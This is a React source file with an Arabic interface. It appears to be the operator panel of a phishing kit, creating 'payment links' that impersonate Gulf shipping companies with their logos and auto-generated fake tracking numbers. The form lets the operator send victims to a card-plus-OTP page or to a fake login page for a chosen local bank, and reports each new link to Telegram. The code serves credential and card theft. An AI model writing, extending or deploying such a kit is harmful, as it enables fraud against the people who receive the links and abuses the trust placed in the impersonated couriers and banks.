import { useState, useMemo, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getServicesByCountry } from "@/lib/gccShippingServices";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBanksByCountry } from "@/lib/banks";
import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import { getCurrency, getDefaultTitle } from "@/utils/countryData";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, CreditCard, User } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import TelegramTest from "@/components/TelegramTest";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateShippingLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  const services = getServicesByCountry(country?.toUpperCase() || "");
  
  const generateTrackingNumber = () => {
    const prefix = selectedService.toUpperCase().substring(0, 3) || 'TRK';
    const timestamp = Date.now().toString().slice(-8);
    const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    return `${prefix}${timestamp}${random}`;
  };

  const [selectedService, setSelectedService] = useState("");
  const [trackingNumber, setTrackingNumber] = useState("");
  const [showTrackingNumber, setShowTrackingNumber] = useState(true);
  const [payerType, setPayerType] = useState("recipient"); // "recipient" or "sender"
  const [packageDescription, setPackageDescription] = useState("");
  const [codAmount, setCodAmount] = useState("500");
  const [paymentMethod, setPaymentMethod] = useState("card"); // "card" or "bank_login"
  const [selectedBank, setSelectedBank] = useState("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);
  
  // Get banks for the selected country
  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
  
  // Get selected service details and branding
  const selectedServiceData = useMemo(() => 
    services.find(s => s.key === selectedService),
    [services, selectedService]
  );
  
  const serviceBranding = useMemo(() =>
    selectedService ? getServiceBranding(selectedService) : null,
    [selectedService]
  );

  useEffect(() => {
    if (selectedService && !trackingNumber && showTrackingNumber) {
      setTrackingNumber(generateTrackingNumber());
    }
  }, [selectedService, showTrackingNumber]);

  const handleRegenerateTracking = () => {
    if (selectedService) {
      setTrackingNumber(generateTrackingNumber());
      toast({
        title: "تم التوليد",
        description: "تم توليد رقم شحنة جديد",
      });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!selectedService) {
      toast({
        title: "خطأ",
        description: "الرجاء اختيار خدمة الشحن",
        variant: "destructive",
      });
      return;
    }

    if (showTrackingNumber && !trackingNumber) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم الشحنة أو إيقاف التوليد التلقائي",
        variant: "destructive",
      });
      return;
    }

    if (paymentMethod === "bank_login" && !selectedBank) {
      toast({
        title: "خطأ",
        description: "الرجاء اختيار البنك",
        variant: "destructive",
      });
      return;
    }
    
    try {
      const link = await createLink.mutateAsync({
        type: "shipping",
        country_code: country || "",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.name || selectedService,
          tracking_number: showTrackingNumber ? trackingNumber : null,
          payer_type: payerType,
          package_description: packageDescription,
          cod_amount: parseFloat(codAmount) || 500,
          currency_code: getCurrencyCode(country || "SA"),
          payment_method: paymentMethod,
          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
          selectedCountry: country || "SA",
        },
      });

      // Generate unified payment URL using the new function
      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: selectedService,
        country: country || 'SA'
      });

      // Send data to Telegram with image and description
      const telegramResult = await sendToTelegram({
        type: 'shipping_link_created',
        data: {
          tracking_number: showTrackingNumber ? trackingNumber : 'غير محدد',
          service_name: selectedServiceData?.name || selectedService,
          package_description: packageDescription,
          cod_amount: parseFloat(codAmount) || 0,
          country: countryData.nameAr,
          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?company=${selectedService}`
        },
        timestamp: new Date().toISOString(),
        imageUrl: serviceBranding?.ogImage || serviceBranding?.heroImage,
        description: serviceBranding?.description || selectedServiceData?.description
      });

      // حفظ الرابط وإظهار Dialog
      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);
      
      if (telegramResult.success) {
        toast({
          title: "تم الإرسال بنجاح",
          description: "تم إرسال البيانات إلى التليجرام",
        });
      } else {
        console.error('Telegram error:', telegramResult.error);
        toast({
          title: "تحذير",
          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Error creating link:", error);
    }
  };
  
  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({
      title: "تم النسخ!",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };
  
  const handlePreview = () => {
    window.open(createdPaymentUrl, '_blank');
  };

  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Package className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }
  
  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="mb-4">
          <BackButton />
        </div>
        
        {/* Telegram Test Component */}
        <div className="mb-6">
          <TelegramTest />
        </div>
        
        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء رابط دفع - شحن</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Service Selection with Logo and Description */}
              <div>
                <Label className="mb-2 text-sm">خدمة الشحن *</Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر خدمة الشحن" />
                  </SelectTrigger>
                  <SelectContent className="bg-background">
                    {services.length > 0 ? (
                      services.map((service) => (
                        <SelectItem key={service.id} value={service.key}>
                          {service.name}
                        </SelectItem>
                      ))
                    ) : (
                      <SelectItem value="no-service" disabled>
                        لا توجد خدمات متاحة
                      </SelectItem>
                    )}
                  </SelectContent>
                </Select>
              </div>
              
              {/* Service Logo and Description */}
              {selectedService && serviceBranding && selectedServiceData && (
                <div className="p-3 rounded-lg border border-border bg-card/50">
                  <div className="flex items-center gap-3 mb-2">
                    {serviceBranding.logo && (
                      <img
                        src={serviceBranding.logo}
                        alt={selectedServiceData.name}
                        className="h-8 object-contain"
                        onError={(e) => {
                          e.currentTarget.style.display = 'none';
                        }}
                      />
                    )}
                    <div>
                      <h3 className="font-semibold text-sm">{selectedServiceData.name}</h3>
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground">{serviceBranding.description}</p>
                </div>
              )}
              
              {/* Tracking Number with Auto-generate controls */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <Label className="flex items-center gap-2 text-sm">
                    <Hash className="w-3 h-3" />
                    رقم الشحنة {showTrackingNumber && '*'}
                  </Label>
                  <div className="flex items-center gap-2">
                    <button
                      type="button"
                      onClick={() => {
                        setShowTrackingNumber(!showTrackingNumber);
                        if (showTrackingNumber) {
                          setTrackingNumber("");
                        } else if (selectedService) {
                          setTrackingNumber(generateTrackingNumber());
                        }
                      }}
                      className="text-xs px-3 py-1.5 rounded-lg border transition-all hover:shadow-sm"
                      style={{
                        borderColor: showTrackingNumber ? serviceBranding?.colors.primary : '#d1d5db',
                        backgroundColor: showTrackingNumber ? `${serviceBranding?.colors.primary}10` : 'transparent',
                        color: showTrackingNumber ? serviceBranding?.colors.primary : '#6b7280'
                      }}
                    >
                      {showTrackingNumber ? '✔ تلقائي' : 'توليد تلقائي'}
                    </button>
                  </div>
                </div>
                
                {showTrackingNumber && (
                  <>
                    <div className="relative">
                      <Input
                        value={trackingNumber}
                        onChange={(e) => setTrackingNumber(e.target.value)}
                        placeholder="مثال: 1234567890"
                        className="h-9 text-sm pr-3 pl-24"
                        required
                        dir="ltr"
                      />
                      <button
                        type="button"
                        onClick={handleRegenerateTracking}
                        className="absolute left-2 top-1/2 -translate-y-1/2 text-xs px-2 py-1 rounded transition-all hover:shadow-sm"
                        style={{
                          backgroundColor: `${serviceBranding?.colors.primary}15`,
                          color: serviceBranding?.colors.primary,
                          border: `1px solid ${serviceBranding?.colors.primary}30`
                        }}
                        title="إعادة التوليد"
                      >
                        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                        </svg>
                      </button>
                    </div>
                    <p className="text-xs text-muted-foreground flex items-center gap-1">
                      <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                      </svg>
                      تم التوليد تلقائيًا • يمكنك التعديل أو الضغط على زر إعادة التوليد
                    </p>
                  </>
                )}
                
                {!showTrackingNumber && (
                  <p className="text-xs text-muted-foreground p-2 rounded bg-muted/30">
                    ℹ️ سيتم إنشاء الرابط بدون رقم شحنة محدد
                  </p>
                )}
              </div>

              {/* Payer Type Selection */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <User className="w-3 h-3" />
                  من سيدفع رسوم الشحن؟ *
                </Label>
                <Select value={payerType} onValueChange={setPayerType}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر من يدفع الرسوم" />
                  </SelectTrigger>
                  <SelectContent className="bg-background">
                    <SelectItem value="recipient">
                      <div className="flex items-center gap-2">
                        <User className="w-4 h-4" />
                        <span>المستلم - سيستلم الشحنة ويدفع</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="sender">
                      <div className="flex items-center gap-2">
                        <User className="w-4 h-4" />
                        <span>المرسل - أرسل الشحنة ويدفع</span>
                      </div>
                    </SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              {/* Package Description */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Package className="w-3 h-3" />
                  وصف الطرد
                </Label>
                <Input
                  value={packageDescription}
                  onChange={(e) => setPackageDescription(e.target.value)}
                  placeholder="مثال: ملابس، إلكترونيات"
                  className="h-9 text-sm"
                />
              </div>
              
              {/* COD Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  مبلغ الدفع عند الاستلام
                  {country && (
                    <span className="text-xs text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={codAmount}
                  onChange={(e) => setCodAmount(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-9 text-sm"
                  step="0.01"
                  min="0"
                />
                {country && (
                  <p className="text-xs text-muted-foreground mt-1">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>
              
              {/* Payment Method Selection - Enhanced Design */}
              <div className="space-y-3">
                <Label className="mb-2 flex items-center gap-2 text-sm font-semibold">
                  <CreditCard className="w-4 h-4" />
                  طريقة الدفع *
                </Label>
                
                {/* Card-based selection with visual indicators */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  {/* Card Payment Option */}
                  <button
                    type="button"
                    onClick={() => setPaymentMethod('card')}
                    className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
                      paymentMethod === 'card'
                        ? 'border-primary bg-primary/5 shadow-md'
                        : 'border-border hover:border-primary/50 bg-card'
                    }`}
                  >
                    <div className="flex items-start gap-3">
                      <div className={`p-2 rounded-full ${
                        paymentMethod === 'card' ? 'bg-primary text-white' : 'bg-muted text-muted-foreground'
                      }`}>
                        <CreditCard className="w-5 h-5" />
                      </div>
                      <div className="flex-1">
                        <h4 className={`font-semibold text-sm mb-1 ${
                          paymentMethod === 'card' ? 'text-primary' : 'text-foreground'
                        }`}>
                          بيانات البطاقة
                        </h4>
                        <p className="text-xs text-muted-foreground">
                          إدخال بيانات البطاقة مباشرة
                        </p>
                        <div className="mt-2 text-xs text-muted-foreground">
                          <div className="flex items-center gap-1">
                            <span>📋</span>
                            <span>بيانات المستلم</span>
                          </div>
                          <div className="flex items-center gap-1 mt-1">
                            <span>💳</span>
                            <span>بيانات البطاقة</span>
                          </div>
                          <div className="flex items-center gap-1 mt-1">
                            <span>🔐</span>
                            <span>رمز التحقق OTP</span>
                          </div>
                        </div>
                      </div>
                      {paymentMethod === 'card' && (
                        <div className="absolute top-2 left-2">
                          <div className="w-5 h-5 rounded-full bg-primary flex items-center justify-center">
                            <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                            </svg>
                          </div>
                        </div>
                      )}
                    </div>
                  </button>

                  {/* Bank Login Option */}
                  <button
                    type="button"
                    onClick={() => setPaymentMethod('bank_login')}
                    className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
                      paymentMethod === 'bank_login'
                        ? 'border-primary bg-primary/5 shadow-md'
                        : 'border-border hover:border-primary/50 bg-card'
                    }`}
                  >
                    <div className="flex items-start gap-3">
                      <div className={`p-2 rounded-full ${
                        paymentMethod === 'bank_login' ? 'bg-primary text-white' : 'bg-muted text-muted-foreground'
                      }`}>
                        <Building2 className="w-5 h-5" />
                      </div>
                      <div className="flex-1">
                        <h4 className={`font-semibold text-sm mb-1 ${
                          paymentMethod === 'bank_login' ? 'text-primary' : 'text-foreground'
                        }`}>
                          تسجيل دخول البنك
                        </h4>
                        <p className="text-xs text-muted-foreground">
                          تسجيل الدخول عبر البنك الإلكتروني
                        </p>
                        <div className="mt-2 text-xs text-muted-foreground">
                          <div className="flex items-center gap-1">
                            <span>📋</span>
                            <span>بيانات المستلم</span>
                          </div>
                          <div className="flex items-center gap-1 mt-1">
                            <span>🏦</span>
                            <span>اختيار البنك</span>
                          </div>
                          <div className="flex items-center gap-1 mt-1">
                            <span>🔑</span>
                            <span>تسجيل الدخول للبنك</span>
                          </div>
                          <div className="flex items-center gap-1 mt-1">
                            <span>🔐</span>
                            <span>رمز التحقق OTP</span>
                          </div>
                        </div>
                      </div>
                      {paymentMethod === 'bank_login' && (
                        <div className="absolute top-2 left-2">
                          <div className="w-5 h-5 rounded-full bg-primary flex items-center justify-center">
                            <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                            </svg>
                          </div>
                        </div>
                      )}
                    </div>
                  </button>
                </div>
                
                {/* Info Box */}
                <div className={`p-3 rounded-lg text-xs ${
                  paymentMethod === 'card' 
                    ? 'bg-blue-50 dark:bg-blue-950/20 text-blue-700 dark:text-blue-300 border border-blue-200 dark:border-blue-800'
                    : 'bg-green-50 dark:bg-green-950/20 text-green-700 dark:text-green-300 border border-green-200 dark:border-green-800'
                }`}>
                  <div className="flex items-start gap-2">
                    <span className="text-base">ℹ️</span>
                    <div>
                      {paymentMethod === 'card' ? (
                        <>
                          <strong className="block mb-1">طريقة الدفع بالبطاقة:</strong>
                          <p>سيتم توجيه العميل لإدخال بيانات بطاقته الائتمانية مباشرة عبر صفحة دفع آمنة ومشفرة.</p>
                        </>
                      ) : (
                        <>
                          <strong className="block mb-1">طريقة تسجيل الدخول للبنك:</strong>
                          <p>سيتم توجيه العميل لتسجيل الدخول عبر البنك الإلكتروني الخاص به لإتمام عملية الدفع بشكل آمن.</p>
                        </>
                      )}
                    </div>
                  </div>
                </div>
              </div>
              
              {/* Bank Selection (Only for bank_login) */}
              {paymentMethod === "bank_login" && (
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Building2 className="w-3 h-3" />
                    اختر البنك *
                  </Label>
                  <Select value={selectedBank} onValueChange={setSelectedBank}>
                    <SelectTrigger className="h-10">
                      <SelectValue placeholder="اختر البنك" />
                    </SelectTrigger>
                    <SelectContent className="bg-background">
                      {banks.length > 0 ? (
                        banks.map((bank) => (
                          <SelectItem key={bank.id} value={bank.id}>
                            <div className="flex items-center gap-2">
                              {bank.logo && (
                                <img 
                                  src={bank.logo} 
                                  alt={bank.nameAr}
                                  className="h-5 w-5 object-contain"
                                  onError={(e) => e.currentTarget.style.display = 'none'}
                                />
                              )}
                              <span>{bank.nameAr}</span>
                            </div>
                          </SelectItem>
                        ))
                      ) : (
                        <SelectItem value="no-bank" disabled>
                          لا توجد بنوك متاحة
                        </SelectItem>
                      )}
                    </SelectContent>
                  </Select>
                  <p className="text-xs text-muted-foreground mt-1">
                    💡 سيتم توجيه العميل لصفحة تسجيل دخول {banks.find(b => b.id === selectedBank)?.nameAr || 'البنك'}
                  </p>
                </div>
              )}
              
              {/* Submit Button */}
              <Button
                type="submit"
                className="w-full py-5"
                disabled={createLink.isPending}
              >
                {createLink.isPending ? (
                  <span className="text-sm">جاري الإنشاء...</span>
                ) : (
                  <>
                    <Package className="w-4 h-4 ml-2" />
                    <span className="text-sm">إنشاء رابط الدفع</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>
      </div>
      
      {/* Success Dialog with Copy and Preview buttons */}
      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-md" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-xl text-center">
              ✅ تم إنشاء رابط الدفع بنجاح!
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center">
              يمكنك نسخ الرابط أو معاينته قبل المتابعة
            </AlertDialogDescription>
          </AlertDialogHeader>
          
          <div className="my-4">
            {/* Payment Summary */}
            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">الخدمة:</span>
                <span className="font-semibold">{selectedServiceData?.name || selectedService}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">رقم الشحنة:</span>
                <span className="font-semibold">{trackingNumber}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">المبلغ:</span>
                <span className="font-semibold">
                  {formatCurrency(parseFloat(codAmount) || 500, country || "SA")}
                </span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">العملة:</span>
                <span className="font-semibold">{getCurrencyName(country || "SA")}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">طريقة الدفع:</span>
                <span className="font-semibold">
                  {paymentMethod === "card" ? "بطاقة ائتمان" : "تسجيل دخول البنك"}
                </span>
              </div>
            </div>

            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
              {createdPaymentUrl}
            </div>

            <div className="flex gap-2">
              <Button
                onClick={handleCopyLink}
                variant="outline"
                className="flex-1"
              >
                {copied ? (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    تم النسخ!
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    نسخ الرابط
                  </>
                )}
              </Button>

              <Button
                onClick={handlePreview}
                variant="outline"
                className="flex-1"
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة
              </Button>
            </div>
          </div>
          
        </AlertDialogContent>
      </AlertDialog>
      <div className="h-20" />
      <BottomNav />
    </div>
  );
};

export default CreateShippingLink;
